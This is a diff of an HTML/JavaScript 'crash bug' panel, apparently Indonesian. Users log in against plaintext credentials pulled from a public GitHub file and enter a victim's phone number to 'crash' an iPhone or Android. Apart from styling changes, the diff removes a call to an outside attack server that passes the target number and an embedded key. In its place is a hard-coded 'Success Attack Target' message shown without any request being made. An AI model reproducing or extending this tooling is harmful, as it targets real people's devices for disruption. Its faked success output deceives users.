@@ -26,35 +26,36 @@
 
     .container {
       background: rgba(15, 15, 15, 0.85);
-      padding: 30px 20px 60px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      padding: 40px 30px 70px;
+      border-radius: 14px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.7);
       text-align: center;
-      width: 90%;
-      max-width: 400px;
+      width: 95%;
+      max-width: 600px;
       position: relative;
     }
 
     .input {
       display: block;
       width: 100%;
-      margin: 15px 0;
-      padding: 10px;
+      margin: 20px 0;
+      padding: 12px;
       background: #1e1e1e;
       border: 1px solid #333;
       border-radius: 6px;
       color: white;
-      font-size: 16px;
+      font-size: 18px;
     }
 
     button {
-      padding: 10px 20px;
-      margin: 10px 5px;
+      padding: 12px 24px;
+      margin: 15px 8px;
       background: #2b3f5c;
       color: white;
       font-weight: bold;
       border: none;
       border-radius: 6px;
+      font-size: 16px;
       cursor: pointer;
       transition: 0.2s;
     }
@@ -91,13 +92,13 @@
       width: 100%;
       text-align: center;
       font-weight: bold;
-      font-size: 14px;
+      font-size: 16px;
       color: #ddd;
     }
 
     .success-text {
-      font-size: 18px;
-      line-height: 1.8;
+      font-size: 20px;
+      line-height: 2;
     }
   </style>
 </head>
@@ -149,7 +150,7 @@
 </div>
 
 <script>
-  const RAW_USERS_URL = "https://raw.githubusercontent.com/ZauzetGithab/Database/main/users.json";
+  const RAW_GITHUB_USERS_JSON = "https://raw.githubusercontent.com/ZauzetGithab/Database/main/users.json";
 
   async function login() {
     const u = document.getElementById("username").value.trim();
@@ -157,8 +158,10 @@
     const err = document.getElementById("errorMsg");
 
     try {
-      const res = await fetch(RAW_USERS_URL);
+      const res = await fetch(RAW_GITHUB_USERS_JSON);
+      if (!res.ok) throw new Error("Gagal fetch");
       const users = await res.json();
+
       const found = users.find(user => user.username === u && user.password === p);
 
       if (found) {
@@ -179,37 +182,26 @@
     location.reload();
   }
 
-  async function crash(type) {
+  function crash(type) {
     const target = document.getElementById("target").value.trim();
     if (!target.startsWith("62")) return alert("❗ Nomor harus diawali 62xxxx");
 
-    const mode = type === "iphone" ? "ios" : "andros";
-    const bugTypeText = type === "iphone" ? "Crash iPhone" : "Crash Android";
     const today = new Date();
     const tanggal = today.getDate();
     const bulan = today.toLocaleString('id-ID', { month: 'long' });
     const tahun = today.getFullYear();
     const tanggalLengkap = `${tanggal} ${bulan} ${tahun}`;
+    const bugTypeText = type === "iphone" ? "Crash iPhone" : "Crash Android";
 
-    try {
-      const res = await fetch(`http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`);
-      const result = await res.json();
+    const html = `
+      ✅ <b>Success Attack Target</b><br/>
+      📱 <b>Target :</b> ${target}<br/>
+      🐞 <b>Bug Type :</b> ${bugTypeText}<br/>
+      📅 <b>Date :</b> ${tanggalLengkap}
+    `;
 
-      if (result.status === true) {
-        const html = `
-          ✅ <b>Success Attack Target</b><br/>
-          📱 <b>Target :</b> ${target}<br/>
-          🐞 <b>Bug Type :</b> ${bugTypeText}<br/>
-          📅 <b>Date :</b> ${tanggalLengkap}
-        `;
-        document.getElementById("successContent").innerHTML = html;
-        showPage("successPage");
-      } else {
-        alert("❌ Gagal mengirim bug. Server tidak merespons!");
-      }
-    } catch (e) {
-      alert("❌ Gagal konek ke server bug!");
-    }
+    document.getElementById("successContent").innerHTML = html;
+    showPage("successPage");
   }
 
   function showPage(id) {
@@ -225,7 +217,7 @@
       document.getElementById("logoutBtn").classList.remove("hidden");
       document.getElementById("globalLinks").classList.remove("hidden");
     }
-  };
+  }
 </script>
 </body>
-    </html>
+</html>
